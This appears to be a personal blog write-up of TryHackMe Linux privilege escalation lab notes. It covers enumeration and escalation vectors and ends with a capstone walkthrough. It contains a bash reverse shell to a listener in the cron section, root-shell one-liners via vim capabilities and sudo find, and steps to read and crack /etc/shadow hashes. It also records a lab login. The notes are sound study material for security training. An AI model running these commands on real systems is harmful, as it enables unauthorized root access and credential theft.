---
title: "THM Privilege Escalation"
date: 2024-12-29 00:00:00 +0800
categories: [Try Hack Me]
tags: [THM]
---

# Linux PrivEsc
## Enumeration/Recon

> `hostname`
> return the hostname of the target

> `uname -a`
> print system info, **kernel used**

> `/proc/version`
> print target system processes
> compiler installed? (e.g GCC)

> `/etc/issue`
> more info of operating system

> `ps`
> see running process on linux
> `ps -A` >> view all running process
> `ps axjf` >> view process tree
> `ps aux` >> view processes for all users

> `env`
> show environmental variables

> `sudo -l`
> list all commands your user can run using `sudo`

> `ls`
> `ls -al`
> `id`

> `/etc/passwd`
> `cat /etc/passwd | cut -d ":" -f` >> list the first column only
> `cat /etc/passwd | grep home` >> list real users only

> `history`
> `ifconfig`
> `ip route`

> **netstat**
> gather info on existing connection and communication
> `netstat -a` >> shows all listening ports and established connections
> `netstat -at` >> TCP
> `netstat -au` >> UDP
> `netstat -l` >> list port in **listening** mode
> `netstat -s` >> list network usage statistics by protocol
> `netstat -tp` >> list connection with service name and PID info
> `netstat -i` >> show interface statistic
> `netstat -ano` >> `-a: display all socket` | `-n: not resolve names` | `-o: display timer`

> **find**
> `find . -name yada` >> find filename yada in current dir
> `-type d/f` `d: directory | f: file`
> `-perm 0777` >> find files with 777 permission
> `-perm a=x` >> find executable files
> `-user username` >> find files for user 'username'
> `-mtime 10` >> find files that modified in the last 10 days
> `-atime 10` >> that were accessed in the last 10 days
> `-cmin -60` >> changed within last hour (60 min)
> `-amin -60` >> accesses within last hour 
> `-size 50M` >> files with 50 MB. Can use `+ and -` for larger and smaller than.
> `find / -perm -u=s -type f 2>/dev/null` >> Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
> 
> 
> **Folders and files that can be written or executed:**
> `find / -writable -type d 2>/dev/null` >> world-writeable folders
> `find / -perm -222 -type d 2>/dev/null` >> world-writeable folders
> `find / -perm -o w -type d 2>/dev/null` >> world-writeable folders
> `find / -perm -o x -type d 2>/dev/null` >> world-executable folders
> 
> 
> **INFO**
> Use `2>/dev/null` to redirect errors to /dev/null and have a clearer output.


>[!abstract] Automated Enumeration Tools

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

## Privilege Escalation: Kernel Exploits

>[!info] 

- Exploiting existing vulnerability
	1 -  Identify kernel version
	2 - search an exploit code
	- searchsploit
	- exploitdb
	3 - run the exploit
- Exploiting misconfiguration and lax permissions.

## Privilege Escalation: Sudo

- `sudo -l`
- find sources - [https://gtfobins.github.io/](https://gtfobins.github.io/)
- execute

> The steps of this privilege escalation vector can be summarized as follows;
>
> 1. Check for LD_PRELOAD (with the env_keep option)
> 2. Write a simple C code compiled as a share object (.so extension) file
> 3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

## Privilege Escalation: SUID

> **SUID** (Set-user Identification) and **SGID** (Set-group Identification).
> Allow files to be executed with the permission level of the file owner or the group owner, respectively.

>[!info] 

> `find / -type f -perm -04000 -ls 2>/dev/null` >> list files have SUID or SGID bits set.

>[!question] Questions

> - use SUID to read `/etc/passwd` and `/etc/shadow`.
> - `unshadow passwd.txt shadow.txt > unshadow.txt`
> - `john --wordlist=[wordlist] unshadow.txt` > to crack the password hash.

## Privilege Escalation: Capabilities

> Capabilities help manage privileges at a more granular level
> `getcap` tool to list enabled capabilities.
> `getcap -r / 2>/dev/null`


>[!question]

- run `getcap -r / 2>/dev/null`
- search for `vim` in [GTFOBins](https://gtfobins.github.io/gtfobins/vim/)
- use capabilities exploit as below:
```
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Privilege Escalation: Cron Jobs

>[!info] 
>Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user.
>Stored in `/etc/crontab`

> [!bug] Exploit
> if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

> `bash -i >& /dev/tcp/10.0.2.15/7777 0>&1`
> `nc -nlvp 7777`

## Privilege Escalation: PATH

> [!info] 
> `echo $PATH`
> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/chaos/.dotnet:/home/chaos/.dotnet/tools

>[!abstract] Notes
>1. What folders are located under $PATH
>2. Does your current user have write privileges for any of these folders?
>3. Can you modify $PATH?
>4. Is there a script/application you can start that will be affected by this vulnerability?

>[!question]

> 1. To find writable folder:
> `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` 
> `grep -v proc` >> get rid of results related to running process.
> 2. Found out `/home/morduch` is writable, and there is a script with SUID bit set that will execute command `thm`.
> 3. because of `thm` command is not defined, we could create a thm file in tmp dir that will execute `/bin/bash`.
> 4. Add `/tmp` dir in `$PATH` so that our `thm` file will be execute. `export PATH=/tmp:$PATH`
> 5. Run the script in `/home/morduch` and obtain a root shell.

## Privilege Escalation: NFS

> [!info] Info
> NFS is Network File Sharing.
> NFS configuration stored in `/etc/exports` file.
> 1. Find a `no_root_squash` from the `cat /etc/exports`.
> 2. Default configuration set `nfsnobody` to strip root privilege.
> 3. If `no_root_squash` is set, we can create exe with SUID.

>[!question]

> Target IP = 10.10.39.7.
> 1. Use attacking machine to find mountable shares on the target machine, `showmount -e 10.10.39.7`.
> 2. Mount a dir from attacking machine to target machine, `mount -o rw 10.10.39.7:/home/backups(mountable dir) /tmp/thm(attacking dir)`


## Capstone Challenge

>[!info] Given credential to ssh
>username: leonard
>password: Penny123

1. `find / -type f -perm -04000 -ls 2>/dev/null` >> list files have SUID or SGID bits set.
2. search base64 in GTFObin.
3. `base64 "/etc/passwd" | base64 --decode` 
4. `base64 "/etc/shadow" | base64 --decode` 
5. unshadow passwd.txt shadow.txt > result.txt
6. john --wordlist=rockyou.txt result.txt >> crack the password hash for user missy.
7. login user missy with password gained and get flag1.
8. Start privesc with `sudo -l`.
9. `/usr/bin/find`
10. search find in GTFObins. 
11. `sudo find . -exec /bin/sh \; -quit` >> to gain root access.
12. Get flag2.
